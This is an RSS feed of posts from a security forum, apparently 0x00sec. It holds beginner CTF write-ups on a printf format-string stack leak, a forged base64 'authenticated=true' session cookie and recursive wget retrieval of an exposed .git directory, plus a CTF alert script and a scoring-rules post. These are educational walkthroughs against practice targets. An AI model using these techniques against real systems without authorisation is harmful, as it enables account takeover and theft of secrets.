<p>Looking at that we can see the program is just printing back our input. Hmm okay, we can work with that. Let’s download the binary, and gather some info on it.</p>
<h1>Binary Examination</h1>
<p>Once the binary is downloaded I'm going to run strings on it for some basic info, and if we're lucky we can grab the flag that way.</p>
<p><span alt="Jumpdrive_Strings_Output" data-base62-sha1="bAyltZfLOlmKvVw75qK05i2871n" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>We get a good bit of detail out of this!</p>
<ol>
<li>We see fopen and flag.txt. I think it’s safe to assume the binary will open the flag file, and store the contents somewhere in memory. Perfect!</li>
<li>Aha, there it is, printf. There are definitely some vulnerabilities in printf if we aren’t careful, which I’ll discuss a little bit later.</li>
<li>We see __stack_chk_fail. Being a noob it took me a bit of research to get this one. We have a stack canary, so that means we can’t overflow this binary. If you’re like I was, and had no clue what a stack canary was you can read about it here: <a href="https://en.wikipedia.org/wiki/Canary_value" rel="nofollow noopener">Stack Canary</a>
</li>
</ol>
<p>Let’s try to run the file locally. Since there is a stack canary we’ll see if we can work with a format string vuln. We’ll first need to create a dummy flag.txt file in the same folder as the jumpdrive binary since it is reading the file. We’ll then run the program, and try see if there is a format string vuln in printf.</p>
<p><span alt="Fmt_Str_Vuln_Initial_Find" data-base62-sha1="A2lvBDIwLvAza6pVeH6zyDR1Jkg" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Lookie there, it’s vulnerable! We successfully read from the stack! But wait, why does this work? Well there’s a safe way, and an unsafe way to use printf let’s take a look at both of them below.</p>
<ul>
<li>Safe way     -&gt; <code>printf("This is my string: %s", myString)</code>
</li>
<li>Unsafe way -&gt; <code>printf(myString)</code>
</li>
</ul>
<p>As for the why, I’ll let someone far more knowledgeable than me explain it: <a href="https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/" rel="nofollow noopener">Printf Vuln</a></p>
<p>This is all great news, but how do we actually use any of this information to exploit this program. Stay tuned for the next paragraph to see.</p>
<h1>Exploitation</h1>
Let's test our local binary once more, but this time let's read as much of the stack as we can.
Tip: One thing we do know from the CTF organizer's is that ASLR is enabled for all PWN challenges.
<p><span alt="Fmt_String_Local_Address_Check(Edited)" data-base62-sha1="zWEbM2uFozE5ZtUMq2Xo3Cu1EfT" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>From an initial look we can see that there seems to be 3 addresses that hold the same data each time (highlighted in previous image). We can also see our input at the end of the output! Keep in mind we are looking at Little Endian ordering, so when we look at the end of the output we can see that <code>0x252e702541414141</code> is actually <code>4141414125702e25</code> which corresponds with the beginning of our intput: <code>AAAA%p.%</code>. Let’s run gdb, and take a look at what’s going on.</p>
<p><span alt="GDB_Main" data-base62-sha1="2J9H2d993muWB6soYliVCNB7cUZ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>At <code>main + 112</code> we see the call to fopen, at <code>main + 144</code> we see 0xdeadbeef that we saw when reading from memory, and at <code>main + 294</code> we see a call to printf. If we set a break point at printf <code>break *main + 294</code> and then run the program we can view some info. I’m using  <a href="https://github.com/longld/peda" rel="nofollow noopener">gdb peda</a> to enhance the display of gdb, and because I like the output. Let’s take a look at the stack.</p>
<p><span alt="Jumpdrive_Stack" data-base62-sha1="3fsAEeLRL3XJjoolN5ibn0zLvfN" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Awesome! We see the three common outputs we saw from printing memory, and right after that we see our flag! So, if we’re correct we should be able to read the flag from the memory address’ directly following <code>0x400911d14e3bcd36</code>! Let’s check it out locally.</p>
<p><span alt="Jumpdrive_Read_Flag_Local" data-base62-sha1="vZ1OYjeA14i2iUWDSGYDT3ywCZJ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>So, considering Little Endianess, if we hex to ascii the two memory blocks following known output we get our flag! <code>5468697369736d79 74657374666c6167 == Thisismytestflag</code>! We got it! Let’s run this on the server, and see if we get the flag there!</p>
<p><span alt="Jumpdrive_Remote_Flag" data-base62-sha1="fwkGvcDIV2K2Ga3al0YsJfoyAFp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now if we take the 3 memory blocks + the beginning of the fourth we get the flag for the challenge!<br>
<code>706374667b707231 6e54665f317a5f34 5f537434525f6d34 707d == pctf{pr1nTf_1z_4_St4R_m4p}</code>. Challenge pwned!</p>
<h1>Conclusion</h1>
If you made it this far, thanks for reading my write up of Jumpdrive! As stated at the beginning this is my first write up, so if you have comments, suggestions, or criticism please let me know! Also, if there is any incorrect info let me know as well!
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/b01lers-ctf-jumpdrive-writeup/19887">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/b01lers-ctf-jumpdrive-writeup/19887</link>
          <pubDate>Tue, 17 Mar 2020 18:08:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19887</guid>
          <source url="https://0x00sec.org/t/b01lers-ctf-jumpdrive-writeup/19887.rss">B01lers CTF: Jumpdrive Writeup</source>
        </item>
        <item>
          <title>Quick Tip: Building a CTF Alert system</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <h1>Quick Tip: Building a CTF Alert system</h1>
<p>No matter if we are talking about CTFs, Bug Bounties or Pentests, automating basic recon tasks as much as possible will give you enormous advantages.</p>
<p>The best part is, that you not only can automate your initial recon but also scheduling these tasks. The company currently does not have any open redirects or subdomain takeovers? Well, maybe that will change in a few months as new assets will be created, old assets will be dumped and forgotten.</p>
<p>In this case, we will cover how to build a small, hacky alert bot for new 0x00sec CTF challenges.</p>
<p>And this is less about the technical part as this could be done in a thousand different ways. It is more about the process. What steps are involved in solving such a problem and what thinking was involved. Personally, I find it often way cooler to see how other people approach problems and finding ways for solutions, then the solution itself.</p>
<h2>Problem</h2>
<p>We all know the 0x00sec ctf challenges. And we all know that they are <code>shock dropped</code>. And if you are a bit competitive you may want to solve them as fast as possible to get points and rankings.</p>
<p>You could constantly hit F5 in the discord or challenge site and wait for a new challenge. Or you automate this task.</p>
<p>Our goal is to find a way to get notified about a new challenge.</p>
<h2>The solution</h2>
<p>Let’s try to find a solution. For the initial brainstorming how we could solve this problem, you may have some ideas:</p>
<ul>
<li>Listening in the discord for the drop message</li>
<li>Scraping the webpage</li>
</ul>
<p>I though scraping the web page may be the easiest way as I am most comfortable with web technologies.</p>
<h3>The recon</h3>
<p>The first step was to visit the ctf page, opening up chrome devtools and inspecting the network tab.</p>
<p><span alt="challenge-page" data-base62-sha1="k5koL4brrgSKXJpZ58dPCRxd5jN" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And we are super lucky because it looks like we have an API we can work with. Because there is a request to <code>https://ctf.0x00sec.org/api/v1/challenges </code></p>
<p>And we get a nice response with all available challenges.</p>
<pre><code class="lang-json">{
    "data": [
        {
            "category": "Web",
            "name": "Exercise #1",
            "template": "/plugins/challenges/assets/view.html",
            "tags": [],
            "script": "/plugins/challenges/assets/view.js",
            "type": "standard",
            "id": 1,
            "value": 15
        },
        {
            "category": "Web",
            "name": "Exercise #2",
            "template": "/plugins/challenges/assets/view.html",
            "tags": [],
            "script": "/plugins/challenges/assets/view.js",
            "type": "standard",
            "id": 2,
            "value": 15
        }
    ],
    "success": true
}
</code></pre>
<h3>Fetching the challenge data</h3>
<p>We can now try to <code>curl</code> the API endpoint to see if we can fetch data unauthenticated.</p>
<pre><code class="lang-auto">➜ curl https://ctf.0x00sec.org/api/v1/challenges                                                 
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="/login?next=%2Fapi%2Fv1%2Fchallenges%3F"&gt;/login?next=%2Fapi%2Fv1%2Fchallenges%3F&lt;/a&gt;.  If not click the link.%   
</code></pre>
<p>However, this was not working. If we inspect the request more closely in Chrome Devtools we see in the headers section that we send some cookies with the request.</p>
<p><span alt="devtools-request-headers" data-base62-sha1="qM9jyKittx9zuvTDUWZsjWzSLCe" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>We send a <code>__cfduid</code> and a <code>session</code>. So let’s try to send these along with curl.</p>
<p><span alt="curl-cookie" data-base62-sha1="yLJm4KU8s8zpYp9nsmNAur9ZeUa" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And we are lucky again because we got a response back. Sometimes you need to specify more attributes for requests to work, as a proper user-agent as sometimes specific agents are blocked.</p>
<p>A cool trick, if you want to save time is to copy the request from Chrome Devtools.</p>
<p><span alt="d" data-base62-sha1="AdIQ5PbBfltTROYlnz6dJOGYus3" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now we need to work with the response data. I used a tool called <a href="https://stedolan.github.io/jq/" rel="nofollow noopener">jq</a> for this. It is an awesome tool if you are working with json data.</p>
<p>We can just pipe the output of our curl command into jq and we are getting a pretty json output.</p>
<p><span alt="curl-jq" data-base62-sha1="2lDRzfR3Hyp4UYl972fQpUjAL7J" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>First, we should add the <code>-s</code> flag to our curl command, so we can silence the output and progress.</p>
<pre><code class="lang-json">curl -s https://ctf.0x00sec.org/api/v1/challenges -H 'cookie: __cfduid=ID; session=SESSION' | jq
{
  "data": [
    {
      "category": "Web",
      "name": "Exercise #1",
      "template": "/plugins/challenges/assets/view.html",
      "tags": [],
      "script": "/plugins/challenges/assets/view.js",
      "type": "standard",
      "id": 1,
      "value": 15
    },
    {
      "category": "Web",
      "name": "Exercise #2",
      "template": "/plugins/challenges/assets/view.html",
      "tags": [],
      "script": "/plugins/challenges/assets/view.js",
      "type": "standard",
      "id": 2,
      "value": 15
    }
  ],
  "success": true
}
</code></pre>
<p>We know that we have two challenges up. So we want some notification if there are more then 2 challenges. We can access the json and <code>data</code> array in jq with</p>
<pre><code class="lang-bash">jq '.data'
</code></pre>
<p>Which results in nearly the same output:</p>
<pre><code class="lang-json">➜ curl -s https://ctf.0x00sec.org/api/v1/challenges -H 'cookie: __cfduid=ID; session=SESSION | jq '.data'
[
  {
    "category": "Web",
    "name": "Exercise #1",
    "template": "/plugins/challenges/assets/view.html",
    "tags": [],
    "script": "/plugins/challenges/assets/view.js",
    "type": "standard",
    "id": 1,
    "value": 15
  },
  {
    "category": "Web",
    "name": "Exercise #2",
    "template": "/plugins/challenges/assets/view.html",
    "tags": [],
    "script": "/plugins/challenges/assets/view.js",
    "type": "standard",
    "id": 2,
    "value": 15
  }
]
</code></pre>
<p>But now we have the content of the <code>data</code> array.  The last step is to get the length of the array with</p>
<pre><code class="lang-bash">jq '.data | length'
</code></pre>
<pre><code class="lang-bash">➜ curl -s https://ctf.0x00sec.org/api/v1/challenges -H 'cookie: __cfduid=ID; session=SESSION' | jq '.data | length' 
2

</code></pre>
<p>And as we see, we get the length of <code>2</code>. So the last thing we need to do is to write a script to automate this and to send us a notification if we have more then 2 challenges up.</p>
<p>Like I said, in the beginning, there are a thousand ways of doing it. I was super lazy and choose a small bash script to do this and send a message over telegram.</p>
<h3>Scripting and notifications</h3>
<p>Let’s write a small script to automate this step.</p>
<pre><code class="lang-bash">#!/bin/bash


number_of_challenges=$(curl -s https://ctf.0x00sec.org/api/v1/challenges -H 'cookie: __cfduid=ID; session=SESSION' | jq '.data | length' )

echo "Number of challanges: $number_of_challenges"

if [ $number_of_challenges -gt 2 ]
  then
    echo "Wake up boi! New challenge is up!"
fi



</code></pre>
<p>The next task is to send us a notification. This can happen over your prefered service:</p>
<ul>
<li>Telegram</li>
<li>Discord</li>
<li>Slack</li>
<li>SMS (Twilio)</li>
</ul>
<p>I’ve gone the Telegram route. You can setup a new bot quite easily and then just do a <code>POST</code> request. Just follow this <a href="https://www.shellhacks.com/telegram-api-send-message-personal-notification-bot/" rel="nofollow noopener">guide</a> to setup the bot and get your api tokens.</p>
<p>So our final script will look like this:</p>
<pre><code class="lang-bash">#!/bin/bash

TOKEN=
CHAT_ID=
MESSAGE="GET UP! New 0x00sec ctf is up!"
URL="https://api.telegram.org/bot$TOKEN/sendMessage"

number_of_challenges=$(curl -s https://ctf.0x00sec.org/api/v1/challenges -H 'cookie: __cfduid=ID; session=SESSION' | jq '.data | length' )

if [ $number_of_challenges -gt 2 ]
  then
    curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$MESSAGE"  &gt; /dev/null
fi



</code></pre>
<p>Last but not least, we need to periodically check for this. So setting up a cronjob on a server might be the easiest.</p>
<pre><code class="lang-json">crontab -e
</code></pre>
<p>And let’s check for this every 15 minutes:</p>
<pre><code class="lang-json">*/15 * * * * bash /home/web/status.sh
</code></pre>
<p>And that’s it. You’ve got your own CTF alert system.</p>
<p>The drawback of this method is that the session is not valid for an infinite time.<br>
If you want it more sophisticated, you can implement a login and grep the session automatically.</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/quick-tip-building-a-ctf-alert-system/19796">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/quick-tip-building-a-ctf-alert-system/19796</link>
          <pubDate>Fri, 13 Mar 2020 09:17:46 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19796</guid>
          <source url="https://0x00sec.org/t/quick-tip-building-a-ctf-alert-system/19796.rss">Quick Tip: Building a CTF Alert system</source>
        </item>
        <item>
          <title>Writeup: 0x00sec CTF - Exercise #2</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p><span alt="header-ctf-0x00sec" data-base62-sha1="wOiVhJMMswDlMlkqZB8w6ZTLfjQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h1>Writeup CTF 0x00sec Web -  Exercise <span class="hashtag">#2</span>
</h1>
<p>Welcome back to my writeups. Now we will cover the 2nd Exercise in the web category.</p>
<h2>Challenge</h2>
<p>If we follow the link in the challenge we see again a simple login box.</p>
<p><span alt="01-login" data-base62-sha1="c2pppn0WEaWpLWcHJfWKLFP1328" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>So let’s start with our normal recon. A good start is always to view the page source. You can find a lot of useful information in there like</p>
<ul>
<li>
<p>Inline javascript</p>
</li>
<li>
<p>External javascript files and libs</p>
</li>
<li>
<p>Hidden input fields</p>
</li>
<li>
<p>Leftover comments</p>
</li>
</ul>
<p>If we take a careful look at the source we see an HTML comment:</p>
<pre><code class="lang-auto">
&lt;!-- TODO: --&gt;

&lt;!-- * Implement secure sessions --&gt;

</code></pre>
<p>And this is our hint. We now need to gather some information about how sessions are working and how we can abuse an insecure implementation.</p>
<h2>Sessions</h2>
<p>At first, we can take a look at <a href="https://www.php.net/manual/en/intro.session.php" rel="nofollow noopener">php.net</a> and read up some information.</p>
<blockquote>
<p>A visitor accessing your web site is assigned a unique id, the so-called session id. This is either stored in a cookie on the user side or is propagated in the URL.</p>
</blockquote>
<p>And if you want to read more about sessions and flaws in their implementation, you should check out the <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet" rel="nofollow noopener">OWASP Session Management Cheatsheet</a>.</p>
<p>Now take a look at our cookies. As we now know, that the session is stored in the cookie. You can check out the cookies in the dev tools under <code>Application</code></p>
<p><span alt="02-chrome-devtools-session" data-base62-sha1="y96YQujOR3l0QaSrLGKv7coZHtB" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And if you now remember from the OWASP Cheatsheet:</p>
<blockquote>
<p>The session ID content (or value) must be meaningless to prevent information disclosure attacks, where an attacker is able to decode the contents of the ID and extract details of the user, the session, or the inner workings of the web application</p>
</blockquote>
<p>So let’s try to decrypt the session id. A very basic and very common encoding for data in the web is <a href="https://en.wikipedia.org/wiki/Base64" rel="nofollow noopener">base64</a>. It is also very common in CTFs, so you should be comfortable with it.</p>
<p>There are multiple ways to decode and encode base64. If you’re on Linux or MacOS you will most likely have the <code>base64</code> binary installed. So you could for example:</p>
<pre><code class="lang-auto">
echo "base64_string" | base64 -D

</code></pre>
<p>Or you can use any of the online encoders. However, one that you should definitely bookmark, is <a href="https://gchq.github.io/CyberChef/" rel="nofollow noopener">CyberChef</a>! It has many “recipes” you can use. For example multiple baseX permutations, various encodings and decodings and if you do not know what this string is, you are looking at you can try the <code>Magic</code> Recipe, which tries to guess what kind of data you have there.</p>
<p>Well, I guess most less experienced people will have issues with identifying the content of session id as base64.</p>
<p>Because it does not really look like base64. If we encode a simple string like <code>abc</code> as base64 we get <code>YWJjCg==</code>.</p>
<pre><code class="lang-auto">
➜ echo "abc" | base64

YWJjCg==

</code></pre>
<p>And if we encode an even longer string we see a common pattern. Which is the <code>==</code> at the end. Which is used for padding. If you read the <a href="https://en.wikipedia.org/wiki/Base64" rel="nofollow noopener">Wikipedia</a> article you will learn how the padding works and that it does not always end with <code>==</code>.</p>
<p>So, but in the end, base64 is very common so let’s just try it. And we can select the <code>From Base64</code> recipe in CyberChef and input our string.</p>
<p><span alt="03-cyberchef-input" data-base62-sha1="fOK2HUGRxnE8nT5WZaA7pZ9Q5My" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And we have an interesting attribute in there. <code>authenticated=false</code>. And some very weird characters under this.</p>
<p>But now, after we read the base64 article, we are base64 experts, right? And if we take a closer took at the base64 encoded string, we see some weird characters at the end, which are not base64.</p>
<pre><code class="lang-auto">
YXV0aGVudGljYXRlZD1mYWxzZQo%3D

</code></pre>
<p>And if you go the route over the terminal with the base64 command, you will also run into issues.</p>
<pre><code class="lang-auto">
➜ echo "YXV0aGVudGljYXRlZD1mYWxzZQo%3D" | base64 -D

Invalid character in input stream.

</code></pre>
<p>So this is another proof that something is wrong with our string. If you have a bit of basic web technology knowledge you may recognize the last 3 characters <code>%3D</code> as URL encoding.</p>
<p>So let’s use the <code>URL Decode</code> recipe in CyberChef.</p>
<p><span alt="04-cyberchef-url-decode" data-base62-sha1="y5ohCMGQDFmkuOogdM1wCxlSc74" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Gotcha! We have our missing padding!</p>
<p>Now we can properly decode our string:</p>
<pre><code class="lang-auto">
➜ echo "YXV0aGVudGljYXRlZD1mYWxzZQo=" | base64 -D

authenticated=false

</code></pre>
<p>Now you may ask, why all this hassle with the URL encoded characters? Well, for once because if you go the route with terminal base64, you would be forced to see the URL encoded character and fix it, because otherwise, you could not decode it.</p>
<p>But more importantly if you had used an online decoder like CyberChef it would give you a wrong output. This means if we do our attack, we would have a wrong input to begin with and would be not able to solve this.</p>
<h3>The Attack</h3>
<p>Now let’s come to the attack. Let’s gather what we already know:</p>
<ul>
<li>
<p>The session is stored in a cookie</p>
</li>
<li>
<p>The session content is base64 encoded</p>
</li>
<li>
<p>The decoded content is <code>authenticated=false</code></p>
</li>
<li>
<p>The session implementation is <strong>insecure</strong></p>
</li>
</ul>
<p>Because we know the content of the session, we can assume that the login script may be checking our session and check if <code>authenticated=true</code>.</p>
<p>So let’s change our cookie to this and see what happens. Let’s use CyberChef for this and we know our input is <code>authenticated=true</code> and we want the <code>To Base64</code> recipe.</p>
<p><span alt="05-cyberchef-base-encode" data-base62-sha1="aRYMHxteF41lR17IshMPXpbiJfr" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Or we can use the terminal:</p>
<pre><code class="lang-auto">
➜ echo "authenticated=true" | base64

YXV0aGVudGljYXRlZD10cnVlCg==

</code></pre>
<p>Now we have the session encoded and can edit our cookie in chrome with a double click on the cookie value and replace the old value with our new one.</p>
<p>And after a page refresh, we should see the flag.</p>
<h2>Conclusion</h2>
<p>Another fun exercise, which should be easy if you properly research sessions, base64 and URL encoding.</p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-2/19685">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-2/19685</link>
          <pubDate>Sat, 07 Mar 2020 07:12:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19685</guid>
          <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-2/19685.rss">Writeup: 0x00sec CTF - Exercise #2</source>
        </item>
        <item>
          <title>Explaining the Bi-Monthly 0x00sec CTF Scoring System</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>Hey 0x00ers!</p>
<p>If you don’t already know, we recently started doing Bi-Monthly 0x00sec CTF Challenges, this means that every 2 weeks, we’re releasing a new quick challenge that should take about ~30 minutes for an intermediate pentester or security hobbyist.</p>
<aside class="quote quote-modified" data-post="1" data-topic="19044">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/pry0cc/40/6_2.png" class="avatar">
    <a href="https://0x00sec.org/t/introducing-bi-monthly-0x00sec-ctf-exercises/19044/">Introducing: Bi-Monthly 0x00sec CTF Exercises!</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/site-feedback/announcements/17"><span class="badge-category-parent-bg" style="background-color: #808281;"></span><span class="badge-category-bg" style="background-color: #AB9364;"></span><span style="" data-drop-close="true" class="badge-category clear-badge" title="This category is where you will come for announcements about the 0x00sec project.">0x00sec Announcements</span></a>
  </div>
  <blockquote>
    Hey 0x00ers! 
We have been working on something really cool, and are bringing bi-monthly 0x00sec CTF exercises. 
The purpose of this is to make very short, 10-30 minute exercises designed to teach you new techniques and get your hacker juices flowing <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title="smiley" alt="smiley" class="emoji"> 
The challenges are supposed to be basic, and not extensive at all. Sharing on how to solve these during the open-challenge window is permitted and good hints are encouraged. 
At the end of the day this initiative isn’t designed to make you…
  </blockquote>
</aside>

<p>There are a few FAQ’s so I’m going to detail them below, but first, I’m going to talk about the scoring system and rules around posting writeups.</p>
<p>First things first:</p>
<h2>New Challenge every 2 weeks.</h2>
<p>A new challenge is posted every 2 weeks, on Saturday at some time before 1am Saturday UTC. Take note: these challenges may be shock-dropped, so keep your ears open on twitter and on the <a href="http://ctf.0x00sec.org">ctf.0x00sec.org</a> platform for new releases!</p>
<h2>Writeups are permitted &amp; encouraged after a challenge ‘expires’</h2>
<ul>
<li>Challenges will remain up even past their expiry,</li>
<li>It will be possible to get points from them even after the new current challenge has been released.</li>
<li>Writeups are permitted after a new challenge is released
<ul>
<li>Basically, if the challenge is the last challenge to be released - don’t post a writeup yet.</li>
</ul>
</li>
</ul>
<h2>Rolling points structure</h2>
<p>The way this works, points from previous challenges will carry on forever, it will be mathematically possible to be in first place at any point in the game even if you joined in 6 months time. You’d just have to go through each challenge and solve each one (perhaps with the help of writeups).</p>
<p>I feel this system works well as it rewards people who are quick and / or consistent, somebody who consistently solves challenges week-by-week will likely be in the lead.</p>
<p>Questions?</p>
<p>If you have any questions let me know! We’ll do our best to answer <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/explaining-the-bi-monthly-0x00sec-ctf-scoring-system/19415">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/explaining-the-bi-monthly-0x00sec-ctf-scoring-system/19415</link>
          <pubDate>Sat, 22 Feb 2020 15:36:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19415</guid>
          <source url="https://0x00sec.org/t/explaining-the-bi-monthly-0x00sec-ctf-scoring-system/19415.rss">Explaining the Bi-Monthly 0x00sec CTF Scoring System</source>
        </item>
        <item>
          <title>Writeup: 0x00sec CTF - Exercise #1</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p><span alt="header-ctf-0x00sec" data-base62-sha1="wOiVhJMMswDlMlkqZB8w6ZTLfjQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h1>Writeup CTF 0x00sec Web -  Exercise <span class="hashtag">#1</span>
</h1>
<p>I was excited as I read that there will be bi-monthly CTF exercises on <a href="https://0x00sec.org/t/introducing-bi-monthly-0x00sec-ctf-exercises/19044">0x00sec</a> as I wanted to do some CTFs for a long time now.</p>
<h2>Challenge</h2>
<p>The challenge or exercise was in the <em>web</em> category. Which means that we have to take a look at web-based attacks like SQL Injections, Cross-Site Scripting and others. It is always good to have the <a href="https://owasp.org/www-project-top-ten/" rel="nofollow noopener">OWASP Top 10</a> in mind.</p>
<p>The challenges description was:</p>
<blockquote>
<p>Get the flag! There are multiple ways to achieve your goal <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</blockquote>
<p>And an URL was provided.</p>
<h3>Initial Recon</h3>
<p>If we open up the URL in a browser, we see a simple login page, where you can enter a username and a password.</p>
<p><span alt="exercise-1" data-base62-sha1="3A0IERLP7vo5aDxyy78HQPFduzL" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>If you see a login field in a CTF, SQL injections may be the first thing that comes to your mind. But it is always good to do some basic recon first.</p>
<p>Because it is just a simple page with a login field and no links to subpages, we are quite limited with the visual recon. But what we can do, is to view the page source.<br>
This is something that you should always do because you can find quite interesting information in the page source like:</p>
<ul>
<li>Javascript and external javascript files</li>
<li>Hidden inputs</li>
<li>Leftover comments</li>
</ul>
<p>In this case, we have luck and there is an interesting comment in there:</p>
<pre><code class="lang-auto">  &lt;!-- TODO: --&gt;
  &lt;!-- * Remove the git directory after publishing --&gt;
</code></pre>
<p>That sounds indeed good. Public accessible <code>.git/</code> directories are a not that uncommon low-hanging-fruit in bug bounties.</p>
<h2>Git</h2>
<p>First, you should learn what <code>git</code> is and what it is used for. From the <a href="https://git-scm.com/" rel="nofollow noopener">offical page</a>:</p>
<blockquote>
<p>Git is a free and open source distributed version control system designed to handle everything from small to very large projects with speed and efficiency.</p>
</blockquote>
<p>Git is a commonly used version control system for software projects of all kind. It keeps track of your source files and changes that are made to them. If you never used git, you should start by playing around with it, learn some basic commands like <code>git add</code>, <code>git commit</code> and understand how it works.</p>
<p>Public accessible git repositories are very sweet because they very likely contain sensitive information because people often commit security-related keys, passwords and other stuff to it. So our goal is to get this information.</p>
<p>If you now played a bit with git or already familiar with it, you know that git creates a hidden <code>.git</code> folder in your project, where you run <code>git init</code>. In this folder, git keeps track of all the changes and commits you make.</p>
<p>So let’s try to access the <code>.git/</code> folder from the browser, to see if it’s really there.<br>
But, we get a Forbidden message if we try to access it.</p>
<p><span alt="forbidden" data-base62-sha1="lcZ5HLxGM50kTa15efdE5A1qT91" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>But this is only for the directory listing. If we try to access a specific file, like <code>config</code> we have access.</p>
<p><span alt="git-config" data-base62-sha1="fHQSbv3EzFWh8W91ro0bl3wi5UA" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h3>Grab the repository</h3>
<p>Now there are several ways to get the repository. One easy way is to use <code>wget</code> and recursively download the repository.</p>
<pre><code class="lang-bash">wget -r --no-parent --connect-timeout=5 http://public-git.com/.git/
</code></pre>
